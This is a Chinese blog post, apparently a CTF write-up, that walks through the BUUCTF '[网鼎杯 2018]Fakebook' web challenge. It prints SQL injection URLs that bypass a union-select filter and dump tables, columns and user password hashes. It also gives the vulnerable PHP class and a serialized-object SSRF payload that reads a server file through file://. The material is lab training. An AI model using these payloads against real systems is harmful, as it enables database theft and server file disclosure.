<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>web-BUU第二页 | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="[网鼎杯 2018]Fakebook进来发现一个login和一个Join，试了下login的弱密码后无果，进行join，注意这里的blog需要一个url的后缀，我使用.com作为后缀，写入成功   发现username变成了链接，点击发现此时url变出了个参数 1http:&#x2F;&#x2F;52ad46cf-68c8-4008-8f0c-4e0be908a654.node4.buuoj.cn">
<meta property="og:type" content="article">
<meta property="og:title" content="web-BUU第二页">
<meta property="og:url" content="http://example.com/2022/11/28/web-BUU%E7%AC%AC%E4%BA%8C%E9%A1%B5/index.html">
<meta property="og:site_name" content="墨水彩笔">
<meta property="og:description" content="[网鼎杯 2018]Fakebook进来发现一个login和一个Join，试了下login的弱密码后无果，进行join，注意这里的blog需要一个url的后缀，我使用.com作为后缀，写入成功   发现username变成了链接，点击发现此时url变出了个参数 1http:&#x2F;&#x2F;52ad46cf-68c8-4008-8f0c-4e0be908a654.node4.buuoj.cn">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2022-11-28T12:39:35.000Z">
<meta property="article:modified_time" content="2023-02-10T12:40:06.630Z">
<meta property="article:author" content="墨水彩笔">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/11/28/web-BUU%E7%AC%AC%E4%BA%8C%E9%A1%B5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2023-02-10 20:40:06'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {
  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }

  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }
})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">67</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">1.</span> <span class="toc-text">[网鼎杯 2018]Fakebook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS"><span class="toc-number">1.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E5%87%BA"><span class="toc-number">2.</span> <span class="toc-text">非预期解出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-number">3.</span> <span class="toc-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">4.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-1"><span class="toc-number">4.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">5.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">6.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BSidesCF-2020-Had-a-bad-day"><span class="toc-number">7.</span> <span class="toc-text">[BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">8.</span> <span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tips"><span class="toc-number">8.1.</span> <span class="toc-text">tips</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number"></span> <span class="toc-text">[GWCTF 2019]我有一个数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-number">1.</span> <span class="toc-text">[BJDCTF2020]Mark loves cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-2"><span class="toc-number">1.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-Fake-XML-cookbook"><span class="toc-number">2.</span> <span class="toc-text">[NCTF2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TIPS-3"><span class="toc-number">3.</span> <span class="toc-text">TIPS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XEE%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">XEE漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML"><span class="toc-number">3.2.</span> <span class="toc-text">XML</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">5.</span> <span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-number">6.</span> <span class="toc-text">[WUSTCTF2020]朴实无华</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-number">7.</span> <span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">8.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">9.</span> <span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A%E9%94%AE%E5%80%BC%E9%80%83%E9%80%B8%EF%BC%8C%E9%94%AE%E5%90%8D%E9%80%83%E9%80%B8"><span class="toc-number">9.1.</span> <span class="toc-text">反序列化字符逃逸的两种方法：键值逃逸，键名逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">10.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ezpop"><span class="toc-number">11.</span> <span class="toc-text">[MRCTF2020]Ezpop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-4"><span class="toc-number">11.1.</span> <span class="toc-text">TIPS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">11.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WesternCTF2018-shrine"><span class="toc-number">12.</span> <span class="toc-text">[WesternCTF2018]shrine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-number">13.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-number">14.</span> <span class="toc-text">[CISCN 2019 初赛]Love Math</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-PYWebsite"><span class="toc-number">15.</span> <span class="toc-text">[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-ReadlezPHP"><span class="toc-number">16.</span> <span class="toc-text">[NPUCTF2020]ReadlezPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-5"><span class="toc-number">16.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU2019-Web1"><span class="toc-number">17.</span> <span class="toc-text">[SWPU2019]Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-6"><span class="toc-number">17.1.</span> <span class="toc-text">TIPS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">17.2.</span> <span class="toc-text">无列名注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL"><span class="toc-number">18.</span> <span class="toc-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">19.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-7"><span class="toc-number">19.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BSidesCF-2019-Futurella"><span class="toc-number">20.</span> <span class="toc-text">[BSidesCF 2019]Futurella</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BSidesCF-2019-Kookie"><span class="toc-number">21.</span> <span class="toc-text">[BSidesCF 2019]Kookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-EasySearch"><span class="toc-number">22.</span> <span class="toc-text">[BJDCTF2020]EasySearch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-8"><span class="toc-number">22.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-Pythonginx"><span class="toc-number">23.</span> <span class="toc-text">[SUCTF 2019]Pythonginx</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-9"><span class="toc-number">23.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">24.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-10"><span class="toc-number">24.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">web-BUU第二页</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-11-28T12:39:35.000Z" title="Created 2022-11-28 20:39:35">2022-11-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-02-10T12:40:06.630Z" title="Updated 2023-02-10 20:40:06">2023-02-10</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>进来发现一个login和一个Join，试了下login的弱密码后无果，进行join，注意这里的blog需要一个url的后缀，我使用.com作为后缀，写入成功</p>


<p>发现username变成了链接，点击发现此时url变出了个参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;52ad46cf-68c8-4008-8f0c-4e0be908a654.node4.buuoj.cn:81&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure>

<p>试了下单引号和双引号都报错</p>
<p>直接用order by 语句试试</p>
<p>发现，数字型的时候能够进行显示变动，字段数是4</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;52ad46cf-68c8-4008-8f0c-4e0be908a654.node4.buuoj.cn:81&#x2F;view.php?no&#x3D;1 order by 4</span><br></pre></td></tr></table></figure>

<p>进行注入</p>
<p>测试后发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;52ad46cf-68c8-4008-8f0c-4e0be908a654.node4.buuoj.cn:81&#x2F;view.php?no&#x3D;1 union select</span><br><span class="line">即使是上述语句都报错（no hack），那么应该是过滤了并且过滤的是union select</span><br></pre></td></tr></table></figure>

<h3 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用&#x2F;**&#x2F;代替空格</span><br><span class="line">或者使用union all select绕过</span><br><span class="line">需要注意的是虽然字段数为4，但并不是4个地方都可以填入值的，因为只有第二列有显示值</span><br></pre></td></tr></table></figure>



<p>那么我们的参数就需要写入第二列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">爆出表名---user</span><br><span class="line">http:&#x2F;&#x2F;7fc36789-5b09-4d61-8d3f-d65de4cb9049.node4.buuoj.cn:81&#x2F;view.php?no&#x3D;-1 union all select 1,group_concat(table_name),2,4 from information_schema.tables where table_schema&#x3D;database()</span><br><span class="line"></span><br><span class="line">爆列名 --- no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS </span><br><span class="line">http:&#x2F;&#x2F;7fc36789-5b09-4d61-8d3f-d65de4cb9049.node4.buuoj.cn:81&#x2F;view.php?no&#x3D;-1 union all select 1,group_concat(column_name),2,4 from information_schema.columns where table_name&#x3D;&#39;users&#39;</span><br><span class="line"></span><br><span class="line">爆数据</span><br><span class="line">http:&#x2F;&#x2F;7fc36789-5b09-4d61-8d3f-d65de4cb9049.node4.buuoj.cn:81&#x2F;view.php?no&#x3D;-1 union all select 1,group_concat(username,passwd,data),3,4 from users</span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line">adminbf98889d70675da7dc753cdf8ac78c49cdcced21919dce21b83dc8c81607e4eaf719aa5f9bc09bbe316d8e98f663c607cfc6eb4337eaa41601cd9bc303c5f583O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:8:&quot;blog.com&quot;;&#125; </span><br><span class="line"></span><br><span class="line">这个内容，前面看不懂，但后面应该是序列化，查看网站发现是php写的那么应该存在php放序列化</span><br><span class="line">并且发现这里面的内容都是刚刚发blog的时候写的，那么反序列化入口应该在刚刚的编辑中</span><br></pre></td></tr></table></figure>

<p>此时面临两个问题</p>
<p>1.php源码，我们需要反序列化</p>
<p>2.反序列化的输入点</p>
<p>进入robots.txt路由发现源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;7fc36789-5b09-4d61-8d3f-d65de4cb9049.node4.buuoj.cn:81&#x2F;robots.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但好像发现不是常规的序列化，找大哥</p>
<p>发现这是SSRF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</span><br><span class="line"></span><br><span class="line">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</span><br><span class="line"></span><br><span class="line">举例 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。</span><br><span class="line">所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。</span><br></pre></td></tr></table></figure>

<p>我们发现我们的blog位置是一条横线，通过观察网页源码发现这里是一个data协议，经过解析发现是</p>
<img src="/2022/11/28/web-BUU%E7%AC%AC%E4%BA%8C%E9%A1%B5/image-20230115142500603.png" alt="image-20230115142500603" style="zoom:67%;">

<p>那么我们尝试传入一个可以访问的url，这里使用百度（可以修改前端代码来显示窗口）</p>






<p>发现好像确实可以实现SSRF，那么我们要怎么利用它来读取flag呢</p>
<p>首先我们这里ssrf的对象是blog的输入，那么我们的操作对象就是blog输入框</p>
<p>通过file协议来进行读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125; </span><br><span class="line"></span><br><span class="line">这里需要我们序列化的内容是data，即第四个列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;7fc36789-5b09-4d61-8d3f-d65de4cb9049.node4.buuoj.cn:81&#x2F;view.php?no&#x3D;-1 union all select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125; &#39;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;7fc36789-5b09-4d61-8d3f-d65de4cb9049.node4.buuoj.cn:81&#x2F;view.php?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>PHP序列化代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;admin&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o &#x3D; new UserInfo();</span><br><span class="line">echo serialize($o);</span><br></pre></td></tr></table></figure>

<h2 id="非预期解出"><a href="#非预期解出" class="headerlink" title="非预期解出"></a>非预期解出</h2><p>使用sql中的load_file</p>
